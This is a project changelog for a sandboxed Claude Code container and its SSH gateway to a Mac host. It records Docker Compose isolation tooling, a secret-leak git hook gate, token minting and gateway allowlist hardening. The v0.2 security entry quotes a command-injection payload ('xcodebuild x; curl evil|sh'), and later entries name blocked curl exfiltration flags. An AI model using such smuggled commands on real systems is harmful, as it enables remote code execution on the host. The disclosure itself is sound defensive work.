# Changelog

All notable changes to `multiplai-container` are documented here.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
This repo is consumed **only at an immutable tag** — `multiplai-kit/setup.sh`
pins `CONTAINER_REF` and fetches a shallow single-tag checkout — so every entry
below describes what a consumer gets by advancing that pin. Tags are never
moved; fixes ship as a new tag.

Entries are hand-written and enforced: `release.sh` refuses to cut a tag while
`## [Unreleased]` is empty.

Notes start at `v0.2`. `v0.1` was the initial import of the repo (the
sandboxed Claude Code container) and predates this changelog.

## [Unreleased]

### Fixed

- **`multiplai-docker freeze`: instances shared one volume set and one
  network.** `docker compose config` *resolves* top-level volume and network
  names against the source project and emits them as explicit `name:` keys
  (`dolceengine_mysql_data`), so the frozen file pinned them for every instance
  — `--instance a` and `--instance b` would have run against the same MySQL
  volume and the same network, defeating the isolation the tool exists for.
  `freeze` now drops the resolved `name` from every non-`external` volume and
  network so Compose re-derives `<project>_<key>` per instance. `external: true`
  entries name something the stack does not own, so their name is kept.
  **Existing profiles must be re-frozen** — the fix is in `freeze`, not at run
  time. Caught by a real `up`, not the harness; the stub fixture now carries
  resolved names and both halves mutate-check.

### Added

- **`up` prints the reachable URLs.** Host ports are stripped so instances can
  coexist, which left no hint of how to reach the stack. `freeze` now records
  the container-side targets of the ports it strips as `x-multiplai-ports`, and
  `up` prints `http://<container>.orb.local:<port>` per service. Ports come from
  the frozen file — the tool never probes a container.

## [0.9] – 2026-08-06

### Added

- **`multiplai-docker` — controlled Docker Compose access from a session
  container.** A session can now start, inspect and tear down **parallel named
  instances** of an allowlisted set of Compose stacks on the Mac, mid-session,
  over the existing SSH bridge, without ever authoring a Docker argument or a
  compose file:

  ```
  ssh host.docker.internal multiplai-docker up   dolce --instance wt1
  ssh host.docker.internal multiplai-docker ls   dolce
  ssh host.docker.internal multiplai-docker logs dolce engine 200 --instance wt1
  ssh host.docker.internal multiplai-docker exec dolce engine --instance wt1 -- python manage.py showmigrations
  ssh host.docker.internal multiplai-docker down dolce --instance wt1
  ```

  The design closes the hole by construction rather than by validation: a
  **profile** is a compose configuration you resolved and froze once on the Mac
  (`multiplai-docker freeze`), stored outside every container mount. The agent
  supplies only labels — a profile name, a verb from a fixed list, an instance
  name, a service name, a numeric tail, and charset-guarded guest argv for
  `exec`. Agent input never reaches Compose, so there is no runtime validator to
  bypass and no TOCTOU window. Instances are ephemeral by construction: the
  compose project is `<prefix>-<instance>`, so named volumes are per-instance
  and `down` always runs `down -v`; `reap-older-than <hours>` catches leaks.
  Published ports are stripped at freeze time, so parallel instances never
  collide — reach services by their OrbStack hostnames.

  Three agents in three worktrees can run `up <profile> --instance wt1|wt2|wt3`
  and get three isolated stacks, each bind-mounting its own worktree's code: the
  one runtime transform re-prefixes binds under `BIND_ROOT` into
  `WORKTREE_ROOT/<instance>` when a worktree of that name exists.

- **Gateway allowlist entry for `multiplai-docker`** — one new branch in
  `container-build-gateway.sh`, holding the verb to a fixed list, the profile
  and instance names to their regexes, and rejecting every caller-supplied flag
  other than `--instance <token>`. `freeze` is deliberately **not** in that list:
  creating or changing a profile is a host-terminal act, so bridge callers are
  denied before the script runs. The no-shell-reparse invariant is untouched —
  argv still travels as data, and argv[0] is pinned to a host-side constant.

- **`tests/multiplai-docker-test.sh`** — a stub-docker harness (no daemon, no
  network) asserting the argv the tool hands Compose: the frozen file verbatim
  when no worktree matches, a temp file with re-prefixed binds and untouched
  named volumes when one does, `down -v`, the per-instance project name, the
  `exec` guest-argv charset, the log-tail cap, the drift warning, and the
  refusal of group/world-writable or symlinked profile files. Wired into CI
  alongside the gateway harness, which gained matching allowlist cases.

### Setup

After `git pull && ./setup.sh`, **each profile must be frozen once on the Mac**
before a session can use it — this is the trust step, and it is the only place
compose input is established:

```bash
multiplai-docker freeze dolce \
  -f ~/Documents/knowhere/PROJECTS/DolceBot/DolceEngine/docker-compose.yml \
  -f ~/Documents/knowhere/PROJECTS/DolceBot/DolceEngine/docker-compose.dev.yml
# then review ~/.local/share/multiplai/docker-profiles/dolce.json once
```

`freeze` derives `PROJECT_DIR`/`BIND_ROOT` from the first `-f` file's directory
and `WORKTREE_ROOT` from the nearest ancestor holding a `.worktrees/` directory;
`--project-dir`, `--bind-root`, `--worktree-root` and `--prefix` override each.
No `authorized_keys` change is needed — the existing forced command covers it.

### Changed

- CI now runs `shellcheck` over **every** shipped shell script except
  `container-build-gateway.sh`, which is zsh on purpose and will never be
  shellcheck-able (`zsh -n` and `tests/gateway-test.sh` cover it instead).
  Previously four scripts were excluded, including `release.sh` and both test
  harnesses — the files where a shell bug is least visible and most expensive.
  The findings were a false positive on git's `@{u}` rev syntax, two on the
  deliberately-unexpanded injection payloads in the gateway harness, and style
  findings in the Apple Containers experiment; each is now either fixed or
  carries a scoped directive saying why it stands.

[0.9]: https://github.com/spikelab/multiplai-container/compare/v0.8...v0.9

## [0.8] – 2026-08-03

### Added

- **Container-wide secret-leak gate.** `git-hooks/dispatch` is installed as
  every git hook via `core.hooksPath` in `/etc/gitconfig`, so every
  repository touched inside the container is gated by default, with no
  per-repo setup and nothing to forget on a fresh clone. `pre-commit` scans
  the staged diff (blocking before a commit object exists); `pre-push` scans
  the range being pushed, which is the backstop for `--no-verify` and for
  commits made outside the container, and the only secret gate private repos
  get — GitHub's free secret scanning and push protection cover public repos
  only. Findings are always `--redact`ed, so a leak report never echoes the
  credential into scrollback, CI logs, or an agent transcript. The dispatcher
  itself offers exactly one bypass, `--no-verify`: there is deliberately no
  env-var skip, which an agent could take on its own mid-task. One caveat is
  inherent to git's config precedence and is NOT covered by the gate: a
  repo-local `core.hooksPath` (what husky/lefthook-style installs write),
  `git -c core.hooksPath=…`, or `GIT_CONFIG_NOSYSTEM=1` outranks system
  config and un-gates that repo — the container entrypoint runs
  `git-hooks/check-hookspath` at start to *warn* (never block) about
  workspace repos with such an override.
  The `pre-push` range construction fails **closed**: when the remote tip
  being replaced is absent from the local odb (typical after the history
  rewrite + force-push the leak banner itself recommends), the scan falls
  back to everything no remote-tracking ref already has, and a range git
  cannot walk at all aborts the push with an explicit scan-error message —
  gitleaks 8.29.0 exits 0 on an invalid range, so an unvalidated range would
  silently scan nothing.
  Repo-local hooks are preserved: `core.hooksPath` *replaces* `.git/hooks`
  rather than adding to it, so the dispatcher chains to each repository's own
  hook of the same name (replaying `pre-push` stdin ref lines verbatim, and
  handing EOF through when there is nothing to replay — via a here-string, not
  a pipe, because under `pipefail` a repo hook that exits without draining
  stdin makes the writer take SIGPIPE once the ref list passes the 64K pipe
  buffer, rejecting the push with no finding and no message). Receive-side hook
  names (`pre-receive`, `update`, `post-receive`, `post-update`,
  `proc-receive`, `push-to-checkout`, `fsmonitor-watchman`) are symlinked
  too, so bare-repo hooks still chain. Without that delegation, installing
  this gate would have silently disabled every existing per-repo hook —
  trading one control for another is not a net gain.
- `git-hooks/gitleaks.toml` — the ruleset the hooks enforce: gitleaks' defaults
  (`useDefault = true`) plus the patterns those defaults **verifiably miss**.
  Tested against gitleaks 8.29.0, which returns "no leaks found" for
  `sk-ant-api03-…`, `sk-ant-oat01-…`, and the exact shape of
  `~/.claude/.credentials.json` — the highest-value credential in this
  environment, since the kit mounts that file into every session. Adds an
  `sk-ant-*` family rule and a database/broker-URL-with-inline-password rule
  (with placeholder allowlisting so `env.example` files stay quiet).
  Complements `multiplai-gh-token`'s transcript hygiene from v0.7: that keeps a
  minted `ghs_` token from being printed, this keeps any credential from being
  committed.
- `gitleaks` 8.29.0 in the image (`GITLEAKS_VERSION`), backing the above. The
  release tarball is now pinned by per-arch SHA256
  (`GITLEAKS_SHA256_X64`/`_ARM64`, from upstream's checksums asset) and
  verified with `sha256sum -c` before extraction — a re-tagged release asset
  or CDN compromise fails the build instead of going undetected. Bump the
  SHA args together with `GITLEAKS_VERSION`.
- `git-hooks/check-hookspath` — warn-only drift check run by the entrypoint,
  covering both ways a repo slips out from under the gate. It scans
  `$WORKSPACE` for repos whose *local* `core.hooksPath` overrides (and
  therefore bypasses) the container-wide gate, **and** for repo-local hooks
  whose names the dispatcher does not symlink and so never run at all —
  `core.hooksPath` replaces `.git/hooks`, so the names deliberately left out of
  the Dockerfile loop (`reference-transaction`, `pre-auto-gc`,
  `post-index-change`) are a real hole, and the same warn-don't-block treatment
  applies. The covered set is read from the dispatcher symlinks at runtime
  rather than restated here, so the Dockerfile loop cannot drift away from the
  check; where that set cannot be determined (a source checkout, where the
  symlinks exist only in the built image) the check is skipped rather than
  guessed at. Depth reaches nested worktrees and sub-projects — this workspace
  has three repos deeper than the original bound saw at all.
- `tests/git-hooks-test.sh` — 30 assertions over throwaway repos: detection and
  redaction on commit and push, the new-branch (`remote_sha` all-zeros) push
  range, the stale-clone force-push regression (unknown remote tip must still
  be scanned; an unwalkable range must fail closed as a scan error),
  empty-stdin replay as EOF, an 800-ref replay to a repo hook that never reads
  stdin (the SIGPIPE case above), both `check-hookspath` warnings plus its
  depth reach and its skip-rather-than-guess path, placeholder URLs staying
  quiet, and both fail-closed paths (missing binary, missing
  ruleset — neither may silently fall back to upstream defaults). Wired into
  CI, which reads `GITLEAKS_VERSION` and `GITLEAKS_SHA256_X64` straight out
  of the Dockerfile so the tested and shipped binaries cannot drift.

[0.8]: https://github.com/spikelab/multiplai-container/compare/v0.7...v0.8

## [0.7] – 2026-07-30

### Added

- `multiplai-gh-token` — host-side minter for **GitHub App installation
  tokens**. Several Apps live side by side as named profiles under
  `~/.local/state/multiplai-gh-token/<app>/{app-id,app.pem,org}`; the App's
  private key never enters a container, which receives only a 1-hour `ghs_`
  token over the SSH bridge. Modes are enforced (700 dir, 600 files, no
  symlinks), every mint is audited to `mint.log`, and `--check` diagnoses a
  credential directory with **no network call and no token printed** — the
  form that is safe inside an agent transcript. Consumed by the kit's
  `GH_TOKEN_APP` mode; setup in `docs/gh-app-token.md`.
- Gateway allowlist branch for `multiplai-gh-token`: at most a leading
  `--json`/`--check` plus one app name, name validated against
  `[A-Za-z0-9._-]`, every other flag rejected, argv[0] pinned to
  `$HOME/.local/bin/multiplai-gh-token` (`~/.local/bin` is not on the login
  PATH the gateway resolves through). Twelve ALLOW/DENY cases in
  `tests/gateway-test.sh` cover it, including the argv[0] rewrite.
- `docs/gh-app-token.md` — host setup guide: creating and installing the App,
  the credential layout and permission recipe, the threat-model table, the
  settled Keychain / Secure-Enclave / 1Password rulings, transcript hygiene
  plus the self-revoke recipe, the audit log, and migration from the
  single-App predecessor `dolce-gh-token`.

- `CHANGELOG.md` (this file), backfilled for every existing tag, so a consumer
  can see what advancing `CONTAINER_REF` actually gets them.
- `SECURITY.md` — threat model of the optional macOS host bridge, supported
  versions, reporting address, and the gateway invariant contributors must
  preserve.
- `release.sh` changelog gate: a release is refused unless `## [Unreleased]`
  has content; on a real release the section is renamed to the new version,
  dated, given a compare link, and committed with the release commit. There is
  deliberately no `--skip-changelog`.
- CI (`.github/workflows/ci.yml`): syntax checks over every shipped script
  (`bash -n`, `zsh -n` for the gateway), `shellcheck` over the scripts that
  pass it cleanly, and the gateway allowlist test suite
  (`tests/gateway-test.sh`).

### Changed

- `README.md`: the `Files` table now lists every shipped file, including
  `md2pdf` and `tests/gateway-test.sh`; the intro no longer links the kit under
  the name "Multiplai" (the umbrella banner is the single suite pointer).
- `README.md` restructured usage-first: the standalone `docker run` quickstart
  now directly follows the intro, and the file inventory sits below all usage
  sections. The "Releasing (maintainers)" section moved to `CLAUDE.md` (which
  now carries the full flow, including the changelog gate); a one-line pointer
  remains in the README. The host-bridge security callout is unchanged, only
  repositioned.

[0.7]: https://github.com/spikelab/multiplai-container/compare/v0.6...v0.7

## [0.6] – 2026-07-26

### Fixed

- Host gateway: a `cd` prefix whose path contains spaces or parentheses now
  works — the workdir is unquoted through the same tokenizer as the rest of
  argv (previously it arrived `%q`-escaped and was used verbatim).
- `release.sh`: the kit-pin rewrite is mode-preserving. The v0.5 rewrite
  replaced the kit's `setup.sh` with a `0600` temp file and silently dropped
  its executable bit; the script now writes in place and verifies `-x`.
- `release.sh`: pushes are atomic (`git push --atomic main <tag>`), so a raced
  rejection can no longer leave an orphaned public tag, and no `eval` is used
  on any computed value.

### Added

- `tests/gateway-test.sh` — a 29-case ALLOW/DENY harness that runs the gateway
  the way `sshd` does, against stub commands. This is the only automated test
  of the container→host security boundary.
- `release.sh` preflight on the kit checkout: it refuses a kit that is not on
  `main` and in sync with `origin/main`, which rules out publishing from a
  runtime checkout (`~/.multiplai-runtimes/*`) or a stale clone.
- `README.md` links the Multiplai umbrella repo.

### Security

- The gateway's metacharacter deny-list is escape-aware: backslash-escaped
  characters travel only as argv data and are stripped before the check, while
  every unescaped metacharacter (and any raw newline) is still denied. No shell
  ever re-parses client input.
- The `xcsift` pipe suffix is honoured only on `swift`/`xcodebuild`/`xcrun`
  heads; `qmd`, `curl` and friends with that suffix are now denied.

[0.6]: https://github.com/spikelab/multiplai-container/compare/v0.5...v0.6

## [0.5] – 2026-07-15

### Added

- `release.sh` — build-gated release tooling that makes the two-repo release
  one command: refuse unless `main` is clean and in sync, require `docker
  build` to pass, tag, bump the kit's `CONTAINER_REF`, then push both repos
  back-to-back. Ships with `VERSION` (last released version) and `CLAUDE.md`
  (the repo's release contract and gateway invariant).
- The image exports `MULTIPLAI_CONTAINER=1`, so marketplace skills detect the
  container explicitly instead of inferring it from `uname` — and can decide
  whether host-bridge instructions belong in an error message.
- `sqlite3` CLI in the image.

### Changed

- PySceneDetect + headless OpenCV are no longer baked into the image. They were
  added for the `screen-demo` skill during this cycle and removed again before
  the tag, because the OpenCV wheel dominated the image size.

### Fixed

- Host gateway `PATH`: `qmd` resolves via `~/.bun/bin`, and nvm's node24 bin is
  prepended so `qmd`'s `better-sqlite3` finds the ABI it was built against
  (Homebrew node had drifted to 26).
- Host gateway allowlist: `swift-build`'s trusted `xcsift` pipe and
  `swift --version` are permitted.

### Documentation

- README: which skills work with and without the host bridge, and a note on
  `MULTIPLAI_CONTAINER`.

[0.5]: https://github.com/spikelab/multiplai-container/compare/v0.4...v0.5

## [0.4] – 2026-07-08

### Added

- Markdown → PDF toolchain baked into the image: `pandoc` + `typst` (two static
  binaries, no system deps) plus the `md2pdf` wrapper, so the canonical
  `pandoc --pdf-engine=typst` invocation is one command and a bare
  `pandoc -o x.pdf` (which would reach for the absent pdflatex) is not needed.
- Host gateway allowlist: `qmd` `search`/`index` subcommands.

### Fixed

- `venv-sync-entrypoint.sh` invokes pip as `python -m pip`.

[0.4]: https://github.com/spikelab/multiplai-container/compare/v0.3...v0.4

## [0.3] – 2026-07-06

### Security

- `ab` can no longer read host files through the real Chrome: the `file:`
  scheme is blocked on its navigation verbs (`open`/`goto`/`navigate`), closing
  the same exfiltration path the `curl` guard already covered. `agent-browser`
  was split out of the blanket allowlist to make this possible.
- `build.sh` refuses to build with the `.env.example` `WORKSPACE` placeholder or
  a non-existent path.
- README documents the host-bridge trust model prominently: enabling the bridge
  grants the container host-side code execution (Swift/Xcode build scripts and
  plugins) and host-file read (via Chrome) — not "a locked-down SSH shell".
- Host gateway: the `curl` flag allowlist blocks `-o`/`-T`/`-K`/`--unix-socket`
  and `@file`, and `pkill` is restricted to simulator/build process names.

### Fixed

- The Claude Code in-app auto-updater is disabled (the persistent
  `~/.claude-cli` mount owns updates); baked CLI bumped to 2.1.202.
- Standalone use works: the entrypoint no longer hard-requires
  `CLAUDE_MULTIPLAI_HOME` — the kit venv sync is skipped instead of aborting —
  and `.env.example` exists for the documented `cp .env.example .env` flow.
- Build portability and reproducibility: a colliding UID-1000 user is renamed
  to `agent` rather than ignored, the base image is pinned by digest, and the
  CLI/uv/bun/rust version args actually pin and bust cache.
- Host gateway tokenizer no longer corrupts multi-word arguments.
- `venv-sync-entrypoint.sh` distinguishes a platform skip from a transient
  install failure (a failed sync is no longer cached as done) and takes an
  atomic update lock so two containers sharing `~/.claude-cli` cannot race npm.
- `.dockerignore` added; `apple-containers-experiment.sh` marked executable.

[0.3]: https://github.com/spikelab/multiplai-container/compare/v0.2...v0.3

## [0.2] – 2026-07-05

### Security

- **Fixed a P0 container→host command injection in the SSH gateway (CWE-78).**
  The gateway exec'd the raw `$SSH_ORIGINAL_COMMAND` through `zsh -lc "$CMD"`
  after a prefix match, so any allowlisted prefix plus a shell metacharacter
  escaped the allowlist (`xcodebuild x; curl evil|sh`) — full host RCE from the
  sandbox. It now rejects shell metacharacters, tokenizes to argv honouring
  quotes only (no expansion), validates `argv[0]` and subcommand against the
  allowlist, handles an optional `cd DIR &&` itself, and execs the argv array
  as data so nothing re-enters a shell. `curl` is locked to http/https on
  loopback, and the `authorized_keys` guidance gained `restrict`.

### Added

- Self-updating Claude Code CLI: when a persistent dir is mounted at
  `~/.claude-cli`, the entrypoint keeps an npm-prefix install of
  `@anthropic-ai/claude-code` there, refreshed every
  `MULTIPLAI_CLI_UPDATE_DAYS` (default 7), and prefers it on `PATH`. No mount,
  or a failed update, falls back to the baked image version — no more
  rebuild-to-bump chore.

[0.2]: https://github.com/spikelab/multiplai-container/compare/v0.1...v0.2
